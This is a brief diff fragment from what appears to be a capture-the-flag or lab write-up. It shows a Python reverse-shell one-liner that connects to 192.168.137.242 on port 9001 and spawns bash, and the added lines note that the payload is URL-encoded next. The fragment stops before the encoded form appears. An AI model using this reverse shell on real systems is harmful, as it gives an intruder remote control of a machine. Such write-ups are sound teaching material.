@@ -110,3 +110,5 @@ we can see with 'ls /usr/bin' that python is installed, so with:
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.242",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 
+with https://www.url-encode-decode.com/ we convert it to:
+
